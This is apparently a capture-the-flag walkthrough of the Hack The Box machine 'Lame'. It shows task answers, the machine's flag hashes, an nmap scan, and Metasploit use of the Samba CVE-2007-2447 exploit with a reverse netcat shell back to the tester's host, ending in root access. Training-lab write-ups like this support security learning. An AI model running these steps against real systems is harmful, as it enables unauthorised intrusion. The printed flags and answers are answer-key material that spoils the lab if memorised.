# <div align="center">Lame</div>
<p align="center">Linux · Easy </p>

<div align="center">
    <img align-item="center" width="200"  src="https://labs.hackthebox.com/storage/avatars/fb2d9f98400e3c802a0d7145e125c4ff.png" alt="Material Bread logo">
</div>

# Task 1:
## How many of the nmap top 1000 TCP ports are open on the remote host?
```
4
```
# Task 2:
## What version of VSFTPd is running on Lame?
```
2.3.4
```
# Task 3:
## There is a famous backdoor in VSFTPd version 2.3.4, and a Metasploit module to exploit it. Does that exploit work here?
```
no
```
# Task 4:
## What version of Samba is running on Lame? Give the numbers up to but not including "-Debian".
```
3.0.20
```
# Task 5:
## What 2007 CVE allows for remote code execution in this version of Samba via shell metacharacters involving the SamrChangePassword function when the "username map script" option is enabled in smb.conf?
```
CVE-2007-2447
```
# Task 6:
## Exploiting CVE-2007-2447 returns a shell as which user?
```
root
```
# Task 7:
## Submit the flag located in the makis user's home directory.
```
ac97c7c414c770a5783e5126fa9cf77b
```

# Task 8:
## Submit the flag located in root's home directory.

```
b021c9a53a054900abcecf87e74be2f6
```
# Task 9:
## We'll explore a bit beyond just getting a root shell on the box. While the official writeup doesn't cover this, you can look at 0xdf's write-up for more details. With a root shell, we can look at why the VSFTPd exploit failed. Our initial nmap scan showed four open TCP ports. Running netstat -tnlp shows many more ports listening, including ones on 0.0.0.0 and the boxes external IP, so they should be accessible. What must be blocking connection to these ports?
```
firewall
```

# Task 10:
## When the VSFTPd backdoor is trigger, what port starts listening?
```
6200
```
# Task 11:
## When the VSFTPd backdoor is triggered, does port 6200 start listening on Lame?
```
Yes
```
# Task 11:
```
yes
```
# <div align="center">Let Start With Nmap scan.</div>
```
hack@box:~Lame$ nmap -sV -A -Pn -sC 10.10.10.3
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-09 01:56 IST
Nmap scan report for 10.10.10.3
Host is up (0.12s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.175
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2024-08-08T16:18:39-04:00
|_clock-skew: mean: 1h51m29s, deviation: 2h49m44s, median: -8m32s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.56 seconds
```
## There are 4 open ports:
* 21/tcp  open  ftp         vsftpd 2.3.4
* 22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
* 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
* 445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

## FTP is open let try to logged in with default credentials
* anonymous:anonymous
```
hack@box:~Lame$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:death): anonymous          
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||41076|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> 
```
### FTP is empty

## Let search for backdoor in VSFTPd version 2.3.4 in metasploit-framework
```
hack@box:~Lame$ msfconsole -q
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
msf6 > search VSFTPd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > 
```
### Let give it a try:
```
msf6 > search VSFTPd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > use 0
[*] Using configured payload cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 10.10.10.3
RHOST => 10.10.10.3
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
```
### The exploit didn't work , we need to find another way.
### As the smb service verion is given let seach for that:
![image](https://github.com/user-attachments/assets/6623cf5d-6d57-401b-9bb1-e522046892c0)
### Here is a CVE 2007-2447 present on smb 3.0.20 that can be exploited by metasploit-framework
## Let use metasploit again.
```
hack@box:~Lame$ msfconsole -q
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
msf6 > search CVE 2007-2447

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

msf6 > 
```
### Ok let try this:
```
msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > set RHOST 10.10.10.3
RHOST => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.175
LHOST => 10.10.14.175
msf6 exploit(multi/samba/usermap_script) > 
```
## Let exploit
```
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.14.175:4444 
[*] Command shell session 1 opened (10.10.14.175:4444 -> 10.10.10.3:46212) at 2024-08-09 02:44:54 +0530
```
### awesome !!
## First of all let stable the shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
### Wow ! we are root .
```
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.14.175:4444 
[*] Command shell session 1 opened (10.10.14.175:4444 -> 10.10.10.3:46212) at 2024-08-09 02:44:54 +0530

python -c 'import pty; pty.spawn("/bin/bash")'
root@lame:/# 
```
## I'm Root user let try to read Root flag
```
root@lame:/# cat /root/root.txt
cat /root/root.txt
b021c9a53a054900abcecf87e74be2f6
root@lame:/# 
```
### we got our root flag
## OK Let find User flag, I'm going to use find command
```
find / -type f -name user*.txt 2> /dev/null
```
### Here is our User flag
```
root@lame:/# find / -type f -name user*.txt 2> /dev/null
find / -type f -name user*.txt 2> /dev/null
/home/makis/user.txt
root@lame:/# 
```
## User flag
```
root@lame:/# cat /home/makis/user.txt
cat /home/makis/user.txt
ac97c7c414c770a5783e5126fa9cf77b
root@lame:/# 
```
### Additional 
### If we read exploit vsftpd 2.3.4 - Backdoor Command Execution, we can undersatnd here they are trying to prevent backdoor, when someone try to exploit vsftpd backdoor firewall is triggered on port 6200.
